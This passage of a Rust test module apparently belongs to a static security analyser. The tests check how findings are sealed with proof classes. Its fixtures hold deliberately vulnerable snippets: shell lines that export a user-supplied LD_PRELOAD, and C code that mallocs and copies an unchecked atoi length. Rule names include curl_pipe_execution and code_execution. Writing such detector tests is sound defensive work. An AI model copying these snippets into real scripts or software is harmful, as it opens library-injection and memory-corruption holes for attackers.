            file: Some("src/EOS/Asset.cpp".to_string()),
            ..Default::default()
        };
        let source =
            "int n = atoi(argv[1]);\nvoid *buf = malloc(n * sizeof(int));\nmemcpy(dst, src, n);";
        assert_eq!(
            super::classify_bounded_overflow_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // --- ld_preload_injection classifier tests ---

    #[test]
    fn ld_preload_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:ld_preload_injection".to_string(),
            file: Some("tests/install-test.sh".to_string()),
            ..Default::default()
        };
        let source = "export LD_PRELOAD=/tmp/libtest.so\n./my_program\n";
        assert_eq!(
            super::classify_ld_preload_injection_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn ld_preload_scope_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:ld_preload_injection".to_string(),
            file: Some("tools/install-dependencies".to_string()),
            ..Default::default()
        };
        let source = "export LD_PRELOAD=$1\nunsetenv(\"ld_preload\")\n./my_program\n";
        assert_eq!(
            super::classify_ld_preload_injection_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn ld_preload_user_input_yields_reachability() {
        // User-controlled $1 flows to LD_PRELOAD= without guard → ReachabilityProof.
        let finding = StructuredFinding {
            id: "security:ld_preload_injection".to_string(),
            file: Some("tools/install-dependencies".to_string()),
            ..Default::default()
        };
        let source = "#!/bin/bash\nLIB=$1\nexport LD_PRELOAD=$1\n./my_program\n";
        assert_eq!(
            super::classify_ld_preload_injection_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // --- P17-3A gate: is_lattice_gap_synthesizable_rule / seal_with_lattice_gap_proof ---

    fn critical_finding(id: &str) -> StructuredFinding {
        StructuredFinding {
            id: id.to_string(),
            severity: Some("Critical".to_string()),
            ..Default::default()
        }
    }

    #[test]
    fn non_constant_time_comparison_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:non_constant_time_comparison");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn non_constant_time_comparison_with_proof_preserved() {
        let mut finding = critical_finding("security:non_constant_time_comparison");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn lcm_use_after_free_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:lcm_use_after_free (CWE-416)");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn lcm_use_after_free_with_proof_preserved() {
        let mut finding = critical_finding("security:lcm_use_after_free (CWE-416)");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn lcm_malloc_integer_truncation_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:lcm_malloc_integer_truncation (CWE-190)");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn lcm_malloc_integer_truncation_with_proof_preserved() {
        let mut finding = critical_finding("security:lcm_malloc_integer_truncation (CWE-190)");
        finding.proof_class = Some(ProofClass::InvariantViolationProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(
            result.proof_class,
            Some(ProofClass::InvariantViolationProof)
        );
    }

    #[test]
    fn lcm_off_by_one_loop_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:lcm_off_by_one_loop (CWE-193)");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn lcm_off_by_one_loop_with_proof_preserved() {
        let mut finding = critical_finding("security:lcm_off_by_one_loop (CWE-193)");
        finding.proof_class = Some(ProofClass::InvariantViolationProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(
            result.proof_class,
            Some(ProofClass::InvariantViolationProof)
        );
    }

    #[test]
    fn lcm_double_free_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:lcm_double_free (CWE-415)");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn lcm_double_free_with_proof_preserved() {
        let mut finding = critical_finding("security:lcm_double_free (CWE-415)");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn raw_pointer_deref_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:raw_pointer_deref");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn raw_pointer_deref_with_proof_preserved() {
        let mut finding = critical_finding("security:raw_pointer_deref");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn oauth_account_fusion_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:oauth_account_fusion_pretakeover");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn oauth_account_fusion_with_proof_preserved() {
        let mut finding = critical_finding("security:oauth_account_fusion_pretakeover");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn react_xss_dangerous_html_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:react_xss_dangerous_html");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn react_xss_dangerous_html_with_proof_preserved() {
        let mut finding = critical_finding("security:react_xss_dangerous_html");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    // --- P17-3B gate: Batch 2 rules ---

    #[test]
    fn intent_divergence_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:intent_divergence");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn intent_divergence_with_proof_preserved() {
        let mut finding = critical_finding("security:intent_divergence");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn mcp_confused_deputy_dispatch_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:mcp_confused_deputy_dispatch");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn mcp_confused_deputy_dispatch_with_proof_preserved() {
        let mut finding = critical_finding("security:mcp_confused_deputy_dispatch");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn ffi_memory_corruption_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:ffi_memory_corruption");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn ffi_memory_corruption_with_proof_preserved() {
        let mut finding = critical_finding("security:ffi_memory_corruption");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn ffi_unsafe_deref_unguarded_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:ffi_unsafe_deref_unguarded");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn ffi_unsafe_deref_unguarded_with_proof_preserved() {
        let mut finding = critical_finding("security:ffi_unsafe_deref_unguarded");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn bounded_overflow_witness_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:bounded_overflow_witness");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn bounded_overflow_witness_with_proof_preserved() {
        let mut finding = critical_finding("security:bounded_overflow_witness");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn ld_preload_injection_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:ld_preload_injection");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn ld_preload_injection_with_proof_preserved() {
        let mut finding = critical_finding("security:ld_preload_injection");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    // --- P17-3C gate: Batch 3 blockchain-class rules ---

    #[test]
    fn oracle_price_manipulation_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:oracle_price_manipulation");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn oracle_price_manipulation_with_proof_preserved() {
        let mut finding = critical_finding("security:oracle_price_manipulation");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn signature_replay_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:signature_replay");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn signature_replay_with_proof_preserved() {
        let mut finding = critical_finding("security:signature_replay");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn unprotected_authority_transition_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:unprotected_authority_transition");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn unprotected_authority_transition_with_proof_preserved() {
        let mut finding = critical_finding("security:unprotected_authority_transition");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn flash_loan_callback_unvalidated_sender_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:flash_loan_callback_unvalidated_sender");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn flash_loan_callback_unvalidated_sender_with_proof_preserved() {
        let mut finding = critical_finding("security:flash_loan_callback_unvalidated_sender");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn reentrancy_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:reentrancy");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn reentrancy_with_proof_preserved() {
        let mut finding = critical_finding("security:reentrancy");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn unsafe_delegatecall_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:unsafe_delegatecall");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }

    #[test]
    fn unsafe_delegatecall_with_proof_preserved() {
        let mut finding = critical_finding("security:unsafe_delegatecall");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    // --- P17-3A gate: Batch 4 mixed-surface rules ---

    #[test]
    fn code_execution_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:code_execution");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }
    #[test]
    fn code_execution_with_proof_preserved() {
        let mut finding = critical_finding("security:code_execution");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn nonce_reuse_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:nonce_reuse");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }
    #[test]
    fn nonce_reuse_with_proof_preserved() {
        let mut finding = critical_finding("security:nonce_reuse");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn unsafe_transmute_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:unsafe_transmute");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }
    #[test]
    fn unsafe_transmute_with_proof_preserved() {
        let mut finding = critical_finding("security:unsafe_transmute");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn curl_pipe_execution_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:curl_pipe_execution");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }
    #[test]
    fn curl_pipe_execution_with_proof_preserved() {
        let mut finding = critical_finding("security:curl_pipe_execution");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn cmake_execute_process_injection_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:cmake_execute_process_injection");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }
    #[test]
    fn cmake_execute_process_injection_with_proof_preserved() {
        let mut finding = critical_finding("security:cmake_execute_process_injection");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn open_cidr_exposure_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:open_cidr_exposure");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }
    #[test]
    fn open_cidr_exposure_with_proof_preserved() {
        let mut finding = critical_finding("security:open_cidr_exposure");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn xxe_external_entity_without_proof_gets_lattice_gap() {
        let finding = critical_finding("security:xxe_external_entity");
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::LatticeGapProposal));
    }
    #[test]
    fn xxe_external_entity_with_proof_preserved() {
        let mut finding = critical_finding("security:xxe_external_entity");
        finding.proof_class = Some(ProofClass::ReachabilityProof);
        let result = super::seal_with_lattice_gap_proof(finding);
        assert_eq!(result.proof_class, Some(ProofClass::ReachabilityProof));
    }
}
